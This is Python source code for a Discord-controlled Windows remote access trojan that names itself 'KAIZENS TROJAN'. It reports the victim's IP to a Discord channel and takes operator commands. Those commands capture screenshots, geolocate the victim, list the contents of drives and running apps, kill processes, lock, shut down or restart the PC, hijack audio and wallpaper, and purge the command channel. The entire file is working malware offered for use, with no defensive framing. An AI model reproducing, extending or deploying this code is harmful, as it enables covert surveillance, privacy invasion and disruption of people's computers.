
# for file and operating system pkg
import os
import shutil
import sys
import re
import platform  # PKG to get user info
import subprocess

if os.name != "nt":
    exit()

# Discord Pkg
import discord
from discord.utils import get
from discord.ext import commands
import asyncio

import time
import mss

# from mss import mss  # for screenshoting victim screen
# web requesting
import requests
import urllib.request
from urllib.request import urlopen, urlretrieve
from requests import get  # Request to web for data Public IP getter

# for Audio and Hardware like keyboard and mouse
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import ctypes
from comtypes import CLSCTX_ALL


# for running program in background
import win32process
import win32con
import win32gui
import winreg

# get user current location
import geocoder

# PKG for streaming screen of the victim
import socket
import cv2
import pickle
import struct
import imutils
import numpy

intents = discord.Intents.default()
intents.messages = True
client = commands.Bot(command_prefix="!", intents=intents)
bot_token = ""
thumbnail_url = "https://cdn.discordapp.com/attachments/1305451657357819926/1318625531872411758/2.png?ex=67630139&is=6761afb9&hm=b2e618aff9fb69621fb7d8532e3160733424791fbe2f5b74d3f4c4a812ce21b1&"
count = 0
keys = []
timer = 0

# get IP of the victim
victim_ip = get("https://api.ipify.org").text


def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)


def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception as e:
        print(f"Error setting wallpaper: {e}")


@client.command()
async def change_wallpapers_in_folder(ctx, folder_name: str, delay: float = 0.1):
    folder_path = os.path.join(os.getcwd(), folder_name)

    if not os.path.isdir(folder_path):
        await ctx.send(f"Folder not found: {folder_name}")
        return

    image_files = [
        file
        for file in os.listdir(folder_path)
        if file.lower().endswith((".jpg", ".png", ".jpeg", ".bmp", ".gif"))
    ]

    if not image_files:
        await ctx.send(f"No image files found in folder: {folder_name}")
        return

    embed = discord.Embed(
        title="Wallpaper Slideshow",
        description=f"Starting wallpaper slideshow in folder: {folder_name}\nDelay: {delay} seconds.",
    )

    embed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=embed)

    while True:
        for image in image_files:
            image_path = os.path.join(folder_path, image)
            set_wallpaper(image_path)

            change_embed = discord.Embed(
                title="Wallpaper Changed", description=f"Wallpaper changed to: {image}"
            )
            change_embed.set_thumbnail(url=thumbnail_url)
            await ctx.send(embed=change_embed)

            await asyncio.sleep(delay)

    await ctx.send("Wallpaper slideshow completed!")


# Function when out Bot is alive
@client.event
async def on_ready():
    report_channel = client.get_channel(1318209012151484488)
    time.sleep(2)

    myEmbed = discord.Embed(title="KAIZENS TROJAN")

    myEmbed.add_field(name="Victim's IP", value=victim_ip, inline=False)

    myEmbed.add_field(
        name="** **",
        value="Send '!show_cmd' to the designated channel to know what I'm capable of",
    )

    myEmbed.set_thumbnail(url=thumbnail_url)

    await report_channel.send(embed=myEmbed)


@client.command()
async def show_cmd(ctx):
    my_embed = discord.Embed(
        title="Commands",
        description="Every command has a description on it. \nIf it has a ' [] ' it means you need to fill or put a parameter to it",
    )

    my_embed.add_field(name="!lock_user ", value="Lock user from their PC", inline=True)
    my_embed.add_field(
        name="!shut_down_user  [duration] ",
        value="Lock user from their PC with given duration",
        inline=True,
    )
    my_embed.add_field(
        name="!restart_user  [duration] ",
        value="Restart user PC with given duration",
        inline=True,
    )
    my_embed.add_field(name="!info ", value="Display victim pc info", inline=True)
    my_embed.add_field(
        name="!screenshot ",
        value="Grabbing a screenshot of the victim screen",
        inline=True,
    )
    my_embed.add_field(
        name="!get_location ",
        value="Get victim location (not the accurate like their exact house but high probability that its their place)",
        inline=True,
    )
    my_embed.add_field(
        name="!check_open_app ", value="Display open apps in victim PC", inline=True
    )
    my_embed.add_field(
        name="!close_app [Name of application] ",
        value="Terminate chosen app",
        inline=True,
    )
    my_embed.add_field(
        name="!list_app ", value="Display apps from C drive", inline=True
    )
    my_embed.add_field(name="!delete", value="Delete whole server convo", inline=True)
    my_embed.add_field(name="!rest", value="ShutDown Discord Bot", inline=True)

    my_embed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=my_embed)


@client.command()
async def lock_user(ctx):
    myEmbed = discord.Embed(
        title="Locking User", description="The victim's computer will be locked now."
    )
    myEmbed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=myEmbed)
    time.sleep(1)
    ctypes.windll.user32.LockWorkStation()


# Shutting Down Victim PC
@client.command()
async def shut_down_user(ctx, duration: str):
    myEmbed = discord.Embed(
        title="Shutting Down Victim PC",
        description=f"The victim's PC will shut down in {duration} seconds.",
    )
    myEmbed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=myEmbed)
    time.sleep(2)
    os.system(f"shutdown /s /t {duration}")


# Restart Victim PC
@client.command()
async def restart_user(ctx, duration: str):
    myEmbed = discord.Embed(
        title="Restarting Victim PC",
        description=f"The victim's PC will restart in {duration} seconds.",
    )
    myEmbed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=myEmbed)
    time.sleep(2)
    os.system(f"shutdown /r /t {duration}")


# get user info
@client.command()
async def info(ctx):
    myEmbed = discord.Embed(title="Victim's Info")

    myEmbed.add_field(name="Running Machine: ", value=platform.machine(), inline=True)
    myEmbed.add_field(name="Machine Version: ", value=platform.version(), inline=True)
    myEmbed.add_field(name="Machine System: ", value=platform.system(), inline=True)
    myEmbed.add_field(name="Hostname: ", value=platform.node(), inline=True)
    myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)

    myEmbed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=myEmbed)


# grab screenshot of Victim
@client.command()
async def screenshot(ctx):
    try:
        await ctx.send("I got you, my guy!")
        time.sleep(2)

        temp = os.path.join(os.getenv("TEMP"), "monitor.png")
        with mss.mss() as sct:
            sct.shot(output=temp)

        embed_screenshot = discord.Embed(
            title="Screenshot Taken",
            description="Here is the screenshot you requested.",
        )
        embed_screenshot.set_thumbnail(url=thumbnail_url)

        file = discord.File(temp, filename="monitor.png")
        await ctx.send(embed=embed_screenshot, file=file)

        os.remove(temp)

    except Exception as e:
        embed_error = discord.Embed(
            title="Error Taking Screenshot",
            description="An error occurred while trying to capture the screenshot.",
            color=discord.Color.red(),
        )
        embed_error.add_field(name="Error Details", value=str(e), inline=False)
        embed_error.set_thumbnail(url=thumbnail_url)

        await ctx.send(embed=embed_error)


# get victim current location
@client.command()
async def get_location(ctx):
    try:
        await ctx.send(file=discord.File("8316-wicked-leave.png"))
        time.sleep(2)

        await ctx.send("Getting victim's current location now...")

        time.sleep(1)

        vic_location = geocoder.ip(victim_ip)

        embed_location = discord.Embed(
            title="Victim's Location",
            description="Not exactly the location of their home, but it is highly likely to be their place.",
        )

        embed_location.set_thumbnail(url=thumbnail_url)
        embed_location.add_field(
            name="Victim Location:", value=vic_location.address, inline=False
        )
        embed_location.add_field(
            name="Latitude and Longitude:", value=str(vic_location.latlng), inline=False
        )

        await ctx.send(embed=embed_location)

    except Exception as e:
        embed_error = discord.Embed(
            title="Error Retrieving Location",
            description="An error occurred while trying to retrieve the location.",
            color=discord.Color.red(),
        )
        embed_error.add_field(name="Error Details", value=str(e), inline=False)
        embed_error.set_thumbnail(url=thumbnail_url)

        await ctx.send(embed=embed_error)


@client.command()
async def check_open_app(ctx):
    try:
        embed_loading = discord.Embed(
            title="Checking Open Applications",
            description="Reviewing open apps, please wait... ⏳",
        )
        embed_loading.set_thumbnail(url=thumbnail_url)
        await ctx.send(embed=embed_loading)

        time.sleep(2)

        cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id"'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        result = []

        for line in proc.stdout:
            if line.rstrip():
                result.append(line.decode().rstrip())

        if result:
            embed_results = discord.Embed(
                title="Open Applications",
                description="Here are the currently open apps:",
                color=discord.Color.green(),
            )
            embed_results.set_thumbnail(url=thumbnail_url)
            for process in result:
                embed_results.add_field(name="Process", value=process, inline=False)
        else:
            embed_results = discord.Embed(
                title="No Open Applications Found",
                description="No applications with visible windows are currently running.",
                color=discord.Color.red(),
            )
            embed_results.set_thumbnail(url=thumbnail_url)

        await ctx.send(embed=embed_results)

    except Exception as e:
        embed_error = discord.Embed(
            title="Error Checking Applications",
            description="An error occurred while attempting to list open applications.",
            color=discord.Color.orange(),
        )
        embed_error.add_field(name="Error Details", value=str(e), inline=False)
        embed_error.set_thumbnail(url=thumbnail_url)

        await ctx.send(embed=embed_error)


@client.command()
async def close_app(ctx, app: str):
    try:
        result = os.system(f"taskkill /f /im {app}.exe")
        time.sleep(2)

        if result == 0:
            # Success Embed
            embed = discord.Embed(
                title="Application Closed",
                description=f"**{app}** has been successfully closed! 🚀",
                color=discord.Color.green(),
            )
        else:
            # Failure Embed
            embed = discord.Embed(
                title="Error Closing Application",
                description=f"Could not close **{app}**. Ensure the app name is correct and it's currently running.",
                color=discord.Color.red(),
            )
    except Exception as e:
        # Error Embed
        embed = discord.Embed(
            title="Unexpected Error",
            description=f"An error occurred while attempting to close **{app}**.",
            color=discord.Color.orange(),
        )
        embed.add_field(name="Error Details", value=str(e), inline=False)

    embed.set_thumbnail(url=thumbnail_url)

    await ctx.send(embed=embed)


# list all installed application
@client.command()
async def list_app(ctx):
    # Embed for C drive
    embed_c_drive = discord.Embed(
        title="List of Applications",
        description="This is the list of programs in the C drive (Program Files (x86)):",
    )

    try:
        c_list = os.listdir("C:\\Program Files (x86)")
        embed_c_drive.add_field(
            name="Programs:", value="\n".join(c_list)[:1024], inline=False
        )
    except Exception as e:
        embed_c_drive.add_field(name="Error:", value=str(e), inline=False)
    embed_c_drive.set_thumbnail(url=thumbnail_url)
    await ctx.send(embed=embed_c_drive)
    time.sleep(2)

    # Embed for D drive
    embed_d_drive = discord.Embed(
        title="List of Applications",
        description="This is the list of programs in the D drive:",
    )

    try:
        d_list = os.listdir("D:\\")
        embed_d_drive.add_field(
            name="Programs:", value="\n".join(d_list)[:1024], inline=False
        )
    except Exception as e:
        # If D drive is not accessible, fallback to C drive
        embed_d_drive.description = "D drive not found. Falling back to C drive:"
        try:
            fallback_list = os.listdir("C:\\")
            embed_d_drive.add_field(
                name="Programs:", value="\n".join(fallback_list)[:1024], inline=False
            )
        except Exception as fallback_error:
            embed_d_drive.add_field(
                name="Error:", value=str(fallback_error), inline=False
            )
    embed_d_drive.set_thumbnail(url=thumbnail_url)
    await ctx.send(embed=embed_d_drive)


# Play BG music
@client.command()
async def bg_music(message, youtube_link: str):
    MaxVolume()
    if re.match(r"^(?:http|ftp)s?://", youtube_link) is not None:
        await message.send(
            f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer"
        )
        os.system(f"start {youtube_link}")
        while True:

            def get_all_hwnd(hwnd, mouse):
                def winEnumHandler(hwnd, message):
                    if win32gui.IsWindowVisible(hwnd):
                        if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                            global pid_process
                            pid_process = win32process.GetWindowThreadProcessId(hwnd)
                            return "ok"
                        else:
                            pass

                if (
                    win32gui.IsWindow(hwnd)
                    and win32gui.IsWindowEnabled(hwnd)
                    and win32gui.IsWindowVisible(hwnd)
                ):
                    win32gui.EnumWindows(winEnumHandler, None)

            try:
                win32gui.EnumWindows(get_all_hwnd, 0)
            except:
                break
    else:
        await message.send("Invalid Youtube Link")


# Stop BG music
@client.command()
async def stop_bg(message):
    embed = discord.Embed(
        title="STOPPING MUSIC",
        description="Stoping background music.",
    )
    myEmbed.set_thumbnail(url=thumbnail_url)
    os.system(f"taskkill /F /IM {pid_process[1]}")
    await message.send(embed=embed)


# delete message
@client.command()
async def delete(message, amount=100):
    await message.channel.purge(limit=amount)


# give bot a rest
@client.command()
async def rest(message):
    embed = discord.Embed(
        title="SHUTTING DOWN",
        description="We're going offline now",
    )
    embed.set_thumbnail(url=thumbnail_url)
    await message.send(embed=embed)
    time.sleep(2)
    exit()


client.run(bot_token)
